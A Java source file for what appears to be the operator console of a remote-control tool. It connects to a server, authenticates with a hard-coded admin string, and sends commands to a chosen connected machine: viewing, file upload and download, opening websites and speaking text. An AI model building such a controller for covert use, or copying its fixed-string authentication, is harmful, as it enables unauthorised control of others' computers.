package AdminClient;

import Client.Client;
import Client.Networking.ClientNetworkHandler;
import NetworkUtils.NetworkUtil;
import NetworkUtils.Packet;
import NetworkUtils.PacketHandler;
import NetworkUtils.Packets.AdminIDPacket;
import NetworkUtils.Packets.HandshakePacket;
import NetworkUtils.Packets.PrintPacket;
import NetworkUtils.Packets.AdminCommandPacket;
import Server.Networking.ServerClient;
import Server.Networking.ServerNetworkHandler;
import Server.Server;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.List;

public class AdminClient {

    public static final int secondsRetryConnect = 5;
    public static final int msRetryFinalConnect = secondsRetryConnect * 1000;

    private static ClientNetworkHandler networkHandler;
    private static PacketHandler packetHandler;

    public static void run() {
        System.out.println("Running admin client!");
        networkHandler = new ClientNetworkHandler();

        while (true) {
            if (!networkHandler.connect(NetworkUtil.port, NetworkUtil.serverDDNS)) {
                System.out.println("Connection failed. Attempting to reconnect...");
                try {
                    Thread.sleep(msRetryFinalConnect);
                } catch (InterruptedException ignored) {
                }
                continue;
            }
            break;
        }

        System.out.println("Established a connection!");
        packetHandler = new PacketHandler(networkHandler.getConnection());

        String adminID = "Winston smells";
        networkHandler.getConnection().sendPacket(new AdminIDPacket(adminID));
        networkHandler.getConnection().sendPacket(new HandshakePacket(new File(System.getProperty("user.home")).getName()));


        startAdminCLI();
    }

    public static void startAdminCLI() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

        while (true) {
            try {
                System.out.println("Enter command to send to server:");
                String command = reader.readLine().trim();
                if (command.isEmpty()) continue;

                processCommand(command);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void processCommand(String input) {
        String[] parts = input.split(" ", 2);
        String command = parts[0].toLowerCase();
        String arguments = parts.length > 1 ? parts[1] : "";

        if (command.equals("use") && arguments.length() > 0) {
            useClientById(arguments);
            return;
        }

        if (Server.getSelectedClient() == null) {
            System.out.println("No client selected. Use 'use <clientID>' to select a client.");
            return;
        }

        switch (command) {
            case "view":
                sendCommandToSelectedClient(new AdminCommandPacket("view"));
                break;
            case "change":
                sendCommandToSelectedClient(new AdminCommandPacket("change " + arguments));
                break;
            case "upload":
                sendCommandToSelectedClient(new AdminCommandPacket("upload " + arguments));
                break;
            case "download":
                sendCommandToSelectedClient(new AdminCommandPacket("download " + arguments));
                break;
            case "print":
                sendCommandToSelectedClient(new AdminCommandPacket("print " + arguments));
                break;
            case "website":
                sendCommandToSelectedClient(new AdminCommandPacket("website " + arguments));
                break;
            case "speak":
                sendCommandToSelectedClient(new AdminCommandPacket("speak " + arguments));
                break;
            case "listconnectedclients":
                sendCommandToSelectedClient(new AdminCommandPacket("listconnectedclients"));
                break;
            default:
                System.out.println("Unknown command! Try again.");
                break;
        }
    }

    public static void sendCommandToSelectedClient(AdminCommandPacket packet) {
        if (Server.getSelectedClient() != null) {
            Server.getSelectedClient().getConnection().sendPacket(packet);
            System.out.println("Command sent to selected client: " + packet.getCommand());
        } else {
            System.out.println("No client selected to send the command to.");
        }
    }

    public static void useClientById(String clientIdStr) {
        try {
            int clientId = Integer.parseInt(clientIdStr);
            ServerClient client = ServerNetworkHandler.getClientById(clientId);
            if (client != null) {
                Server.setSelectedClient(client);
                System.out.println("Client with ID " + clientId + " selected.");
            } else {
                System.out.println("No client found with ID: " + clientId);
            }
        } catch (NumberFormatException e) {
            System.out.println("Invalid client ID format.");
        }
    }

    public static void loop() {
        List<Packet> packets = networkHandler.getConnection().parseReceivedPackets();

        packets.forEach(packet -> {
            System.out.println("Received packet: " + packet.toString());

            if (packet instanceof PrintPacket) {
                PrintPacket printPacket = (PrintPacket) packet;
                System.out.println("Server Response: " + printPacket.getMessage());
            }

            packet.execute(packetHandler);
        });
    }
}
